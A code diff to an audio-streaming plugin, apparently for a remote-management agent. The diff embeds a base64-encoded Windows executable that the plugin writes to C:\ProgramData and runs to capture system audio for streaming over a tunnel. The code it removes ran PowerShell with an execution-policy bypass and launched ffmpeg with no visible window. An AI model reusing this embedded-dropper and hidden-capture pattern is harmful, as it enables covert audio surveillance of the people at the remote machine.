@@ -1,4 +1,4 @@
-/* audiostream-plugin-v8-ffmpeg */
+﻿/* audiostream-plugin-v9-exe */
 /*
 Copyright 2018-2022 Intel Corporation
 
@@ -4061,6 +4061,7 @@ function onTunnelData(data)
                 global._winAudioCapture = (function () {
                     var obj = {};
                     var _active = null;
+                    var _EXE_B64 = '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CQHoB3ICqQD3BwACqQD8B3gCkQDBBn0CEQDhAm4ACQAgAJMACQAkAJgACAAoAKAACAAsAKUALgAjAMcCLgAbAL4CQwA7AAsBQwAzANsAYwAzABQBYwA7AAsBgwA7AAsBgwAzAD4BowAzAGgBowA7AAsBwwA7AAsBwwAzAJIBDwDNABcAzwAjAM0ATQDPAMwB7wGFAjYGAAE3AKoCAQAEgAAAAAAAAAAAAAAAAAAAAACrBQAABAAAAAAAAAAAAAAAAQCEAAAAAAAAAAAAADxNb2R1bGU+AG1jLXdhc2FwaS1jYXAuZXhlAElNTURldmljZUVudW1lcmF0b3IASU1NRGV2aWNlAElNTURldmljZUNvbGxlY3Rpb24ASUF1ZGlvQ2xpZW50AElBdWRpb0NhcHR1cmVDbGllbnQAV0FWRUZPUk1BVEVYAFByb2dyYW0AbXNjb3JsaWIAU3lzdGVtAFZhbHVlVHlwZQBPYmplY3QARW51bUF1ZGlvRW5kcG9pbnRzAEdldERlZmF1bHRBdWRpb0VuZHBvaW50AEdldERldmljZQBSZWdpc3RlckVuZHBvaW50Tm90aWZpY2F0aW9uQ2FsbGJhY2sAVW5yZWdpc3RlckVuZHBvaW50Tm90aWZpY2F0aW9uQ2FsbGJhY2sAR3VpZABBY3RpdmF0ZQBPcGVuUHJvcGVydHlTdG9yZQBHZXRJZABHZXRTdGF0ZQBHZXRDb3VudABJdGVtAEluaXRpYWxpemUAR2V0QnVmZmVyU2l6ZQBHZXRTdHJlYW1MYXRlbmN5AEdldEN1cnJlbnRQYWRkaW5nAElzRm9ybWF0U3VwcG9ydGVkAEdldE1peEZvcm1hdABHZXREZXZpY2VQZXJpb2QAU3RhcnQAU3RvcABSZXNldABTZXRFdmVudEhhbmRsZQBHZXRTZXJ2aWNlAEdldEJ1ZmZlcgBSZWxlYXNlQnVmZmVyAEdldE5leHRQYWNrZXRTaXplAHdGb3JtYXRUYWcAbkNoYW5uZWxzAG5TYW1wbGVzUGVyU2VjAG5BdmdCeXRlc1BlclNlYwBuQmxvY2tBbGlnbgB3Qml0c1BlclNhbXBsZQBjYlNpemUATE9PUEJBQ0sAU0lMRU5UAFNIQVJFRABDTFNDVFhfQUxMAElJRF9BQwBJSURfQUNDAENvSW5pdGlhbGl6ZUV4AEdldERlZmF1bHREZXZpY2UARXhjZXB0aW9uAFNhZmVNc2cATWFpbgAuY3RvcgBkYXRhRmxvdwBkd1N0YXRlTWFzawBwcERldmljZXMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAE91dEF0dHJpYnV0ZQByb2xlAHBwRW5kcG9pbnQAcHdzdHJJZABNYXJzaGFsQXNBdHRyaWJ1dGUAVW5tYW5hZ2VkVHlwZQBwcERldmljZQBwQ2xpZW50AGlpZABkd0Nsc0N0eABwQWN0aXZhdGlvblBhcmFtcwBwcEludGVyZmFjZQBzdGdtQWNjZXNzAHBwUHJvcGVydGllcwBwcHN0cklkAHBkd1N0YXRlAHBjRGV2aWNlcwBuRGV2aWNlAFNoYXJlTW9kZQBTdHJlYW1GbGFncwBobnNCdWZmZXJEdXJhdGlvbgBobnNQZXJpb2RpY2l0eQBwRm9ybWF0AEF1ZGlvU2Vzc2lvbkd1aWQAcE51bUJ1ZmZlckZyYW1lcwBwaG5zTGF0ZW5jeQBwTnVtUGFkZGluZ0ZyYW1lcwBwcENsb3Nlc3RNYXRjaABwcERldmljZUZvcm1hdABwaG5zRGVmYXVsdERldmljZVBlcmlvZABwaG5zTWluaW11bURldmljZVBlcmlvZABldmVudEhhbmRsZQByaWlkAHBwdgBwcERhdGEAcE51bUZyYW1lc0F2YWlsYWJsZQBwZHdGbGFncwBwdTY0RGV2aWNlUG9zaXRpb24AcHU2NFFQQ1Bvc2l0aW9uAE51bUZyYW1lc1JlYWQAcE51bUZyYW1lc0luTmV4dFBhY2tldAByZXNlcnZlZABkd0NvSW5pdABlbgBleABhcmdzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBtYy13YXNhcGktY2FwAENvbUltcG9ydEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEludGVyZmFjZVR5cGVBdHRyaWJ1dGUAQ29tSW50ZXJmYWNlVHlwZQBTdHJ1Y3RMYXlvdXRBdHRyaWJ1dGUATGF5b3V0S2luZABEbGxJbXBvcnRBdHRyaWJ1dGUAb2xlMzIuZGxsAE1hcnNoYWwAR2V0T2JqZWN0Rm9ySVVua25vd24AUmVsZWFzZQBUb1N0cmluZwBTdHJpbmcAUmVwbGFjZQBnZXRfTGVuZ3RoAFN1YnN0cmluZwBTeXN0ZW0uSU8AUGF0aABHZXRUZW1wUGF0aABJbnRQdHIAWmVybwBDb21iaW5lAENvbmNhdABGaWxlAFdyaXRlQWxsVGV4dABUeXBlAEdldFR5cGVGcm9tQ0xTSUQAQWN0aXZhdG9yAENyZWF0ZUluc3RhbmNlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAFB0clRvU3RydWN0dXJlAEZyZWVDb1Rhc2tNZW0ASW50MzIATWVtb3J5U3RyZWFtAFN5c3RlbS5UaHJlYWRpbmcAVGhyZWFkAFNsZWVwAEJ5dGUAQXJyYXkAQ2xlYXIAQ29weQBCaXRDb252ZXJ0ZXIAVG9TaW5nbGUATWF0aABNaW4ATWF4AFN0cmVhbQBXcml0ZQBUb0FycmF5AFNldExlbmd0aABzZXRfUG9zaXRpb24AQ29udmVydABUb0Jhc2U2NFN0cmluZwBNb3ZlAEV4aXN0cwAuY2N0b3IAAAAANU4AbwAgAGEAYwB0AGkAdgBlACAAcgBlAG4AZABlAHIAIABlAG4AZABwAG8AaQBuAHQAcwAAAw0AAAMgAAADCgAAC3MAdABhAHIAdAAACWUAbgB1AG0AABVoAGUAYQBkAGUAcgAuAHQAeAB0AAATUwBUAEEAUgBUAEkATgBHADoAAElCAEMARABFADAAMwA5ADUALQBFADUAMgBGAC0ANAA2ADcAQwAtADgARQAzAEQALQBDADQANQA3ADkAMgA5ADEANgA5ADIARQABDWQAZQB2AGkAYwBlAAARYQBjAHQAaQB2AGEAdABlAAANZgBvAHIAbQBhAHQAAAlpAG4AaQB0AAAdYwBhAHAAdAB1AHIAZQAtAGMAbABpAGUAbgB0AAEbcwB0AGEAcgB0AC0AYwBhAHAAdAB1AHIAZQABF3MAdABvAHAALgBzAGkAZwBuAGEAbAAADUEAVQBEAEkATwA6AAADOgAABzoAMQA2AAANYwBoAHUAbgBrAF8AAAVEADYAABEuAGIANgA0AC4AdABtAHAAAAkuAGIANgA0AAAXRQBSAFIATwBSADoAcwB0AGUAcAA9AABJMQBDAEIAOQBBAEQANABDAC0ARABCAEYAQQAtADQAYwAzADIALQBCADEANwA4AC0AQwAyAEYANQA2ADgAQQA3ADAAMwBCADIAAUlDADgAQQBEAEIARAA2ADQALQBFADcAMQBFAC0ANAA4AGEAMAAtAEEANABEAEUALQAxADgANQBDADMAOQA1AEMARAAzADEANwABAAAAnow90xnkUEmX2eAMZK212gAIt3pcVhk04IkHIAMBCAgQGAYgAgEOEBgEIAEBGAkgBAERDQgYEBgGIAIBCBAYBSABARAOBSABARAIBSABARAJBiACAQkQGAkgBgEICQoKGBgFIAEBEAoHIAMBCBgQGAUgAQEQGAcgAgEQChAKAyAAAQcgAgERDRAYDSAFARAYEAkQCRALEAsEIAEBCQIGBwIGCQQAAAIABAIAAAACBggEAAAAAAQXAAAAAwYRDQUAAggYCQYAARIMEggFAAEOEhEFAAEBHQ4FIAEBER0BFQErBCABAQgEIAEBDikBACRBOTU2NjREMi05NjE0LTRGMzUtQTc0Ni1ERThEQjYzNjE3RTYAAAUgAQERNQgBAAEAAAAAACkBACRENjY2MDYzRi0xNTg3LTRFNDMtODFGMS1COTQ4RTgwNzM2M0YAACkBACQwQkQ3QTFCRS03QTFBLTQ0REItODM5Ny1DQzUzOTIzODdCNUUAACkBACQxQ0I5QUQ0Qy1EQkZBLTRjMzItQjE3OC1DMkY1NjhBNzAzQjIAACkBACRDOEFEQkQ2NC1FNzFFLTQ4YTAtQTRERS0xODVDMzk1Q0QzMTcAAAUgAQERPQQAARwYBAABCBgOBwgYEgwYEhAJGBIMEgwDIAAOBSACDg4OAyAACAUgAg4ICAMHAQ4DAAAOAgYYBQACDg4OBQACAQ4OBwACElkRDQIFAAEcElkGAAESWRFhBgACHBgSWQQAAQEYBQABDh0cBAABAQgHAAMBEnUICAgABAEYHQUICAYAAgwdBQgFAAIICAgHIAMBHQUICAMgAAoEIAAdBQQgAQEKBCABDg4GAAMODg4OBQABDh0FBAABAg4HAAQODg4ODjQHJg4OElkSCBIMGBIUGBEcAggIGBIYDggIEmkIHQUJGAkJCwsIHQUICAgMBh0FDg4SER0cAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAFg6AAAAAAAAAAAAAG46AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOgAAAAAAAAAAX0NvckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAADgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAJAAAACgQAAAXAIAAAAAAAAAAAAAAEMAAOoBAAAAAAAAAAAAAFwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAS8AQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACYAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAAEQAEgABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAbQBjAC0AdwBhAHMAYQBwAGkALQBjAGEAcAAuAGUAeABlAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEwAEgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABtAGMALQB3AGEAcwBhAHAAaQAtAGMAYQBwAC4AZQB4AGUAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAACAOgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
 
                     function pad6(n) { return ('000000' + n).slice(-6); }
 
@@ -4085,26 +4086,23 @@ function onTunnelData(data)
                             return;
                         }
 
-                        var csPath  = tmpDir + '\\wasapi.cs';
-                        var psPath  = tmpDir + '\\capture.ps1';
                         var hdrPath = tmpDir + '\\header.txt';
+                        var exePath = 'C:\\ProgramData\\mc-wasapi-cap.exe';
 
-                        try { fs.writeFileSync(csPath, buildCS(), { encoding: 'utf8' }); } catch (e) {
-                            try { tunnel.write('ERROR:write .cs: ' + String(e).substr(0, 80)); } catch (_x) {}
-                            return;
+                        // Self-extract the EXE if not already present
+                        if (!fs.existsSync(exePath)) {
+                            try {
+                                var exeBuf = Buffer.from(_EXE_B64, 'base64');
+                                fs.writeFileSync(exePath, exeBuf);
+                            } catch (e) {
+                                try { tunnel.write('ERROR:extract EXE failed: ' + String(e).substr(0, 80)); } catch (_x) {}
+                                return;
+                            }
                         }
-                        try { fs.writeFileSync(psPath, buildPS(tmpDir), { encoding: 'utf8' }); } catch (e) {
-                            try { tunnel.write('ERROR:write .ps1: ' + String(e).substr(0, 80)); } catch (_x) {}
-                            return;
-                        }
-                        try { fs.writeFileSync(hdrPath, 'STARTING:js_started', { encoding: 'utf8' }); } catch (_x) {}
 
-                        var psExe = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
                         var proc = null;
                         try {
-                            proc = cp.execFile(psExe, [
-                                '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', psPath
-                            ], function () {});
+                            proc = cp.execFile(exePath, [tmpDir], function () {});
                         } catch (e) {
                             try { tunnel.write('ERROR:execFile failed: ' + String(e).substr(0, 80)); } catch (_x) {}
                             return;
@@ -4125,10 +4123,10 @@ function onTunnelData(data)
                                 try { tunnel.write('WAIT'); } catch (_x) {}
                                 lastKeepalive = now;
                             }
-                            if (!headerSent && (now - startTime) > 120000) {
+                            if (!headerSent && (now - startTime) > 30000) {
                                 var lastHdr = 'unknown';
-                                try { lastHdr = String(fs.readFileSync(hdrPath, { encoding: 'utf8' })).trim().substr(0, 60); } catch (_x) {}
-                                try { tunnel.write('ERROR:120s timeout. Last PS status: ' + lastHdr); } catch (_x) {}
+                                try { lastHdr = String(fs.readFileSync(hdrPath, { encoding: 'utf8' })).trim().substr(0, 120); } catch (_x) {}
+                                try { tunnel.write('ERROR:30s timeout. EXE status: ' + lastHdr); } catch (_x) {}
                                 obj._stopCapture(); return;
                             }
                             if (headerSent && (now - lastChunk) > 10000) {
@@ -4176,204 +4174,6 @@ function onTunnelData(data)
                             } catch (_x) {}
                         }, 2000);
                     };
-
-                    function buildPS(tmpDir) {
-                        var d = tmpDir.replace(/'/g, "''");
-                        return (
-'$d = \'' + d + '\'\n' +
-'$ff = "C:\\ProgramData\\ffmpeg.exe"\n' +
-'$stop = "$d\\stop.signal"\n' +
-'Set-Content "$d\\header.txt" "STARTING:ps_started" -Encoding ASCII\n' +
-'if (-not (Test-Path $ff)) {\n' +
-'    Set-Content "$d\\header.txt" "ERROR:ffmpeg not found at $ff" -Encoding ASCII; exit\n' +
-'}\n' +
-'$sr = 44100; $ch = 2; $bpf = $ch * 2; $tgt = $sr * $bpf / 20\n' +
-'try {\n' +
-'    $psi = New-Object System.Diagnostics.ProcessStartInfo\n' +
-'    $psi.FileName = $ff\n' +
-'    $psi.Arguments = "-f wasapi -loopback -i default -f s16le -ar $sr -ac $ch pipe:1"\n' +
-'    $psi.RedirectStandardOutput = $true\n' +
-'    $psi.RedirectStandardError  = $true\n' +
-'    $psi.UseShellExecute = $false\n' +
-'    $psi.CreateNoWindow  = $true\n' +
-'    $proc = [System.Diagnostics.Process]::Start($psi)\n' +
-'    if (-not $proc) { Set-Content "$d\\header.txt" "ERROR:ffmpeg Start failed" -Encoding ASCII; exit }\n' +
-'    Set-Content "$d\\header.txt" "AUDIO:$sr`:$ch`:16" -Encoding ASCII\n' +
-'    $stream = $proc.StandardOutput.BaseStream\n' +
-'    $buf = New-Object byte[] 8192\n' +
-'    $ms  = New-Object System.IO.MemoryStream\n' +
-'    $idx = 0\n' +
-'    while (-not (Test-Path $stop)) {\n' +
-'        $n = $stream.Read($buf, 0, $buf.Length)\n' +
-'        if ($n -le 0) { break }\n' +
-'        $ms.Write($buf, 0, $n)\n' +
-'        if ($ms.Length -ge $tgt) {\n' +
-'            $chunk = $ms.ToArray(); $ms = New-Object System.IO.MemoryStream\n' +
-'            $aligned = [Math]::Floor($chunk.Length / 4) * 4\n' +
-'            $chunk = $chunk[0..($aligned-1)]\n' +
-'            $tmp = "$d\\chunk_$($idx.ToString(\'D6\')).b64.tmp"\n' +
-'            $fin = "$d\\chunk_$($idx.ToString(\'D6\')).b64"\n' +
-'            [System.IO.File]::WriteAllText($tmp, [System.Convert]::ToBase64String($chunk))\n' +
-'            [System.IO.File]::Move($tmp, $fin)\n' +
-'            $idx++\n' +
-'        }\n' +
-'    }\n' +
-'    if (-not $proc.HasExited) { $proc.Kill() }\n' +
-'} catch {\n' +
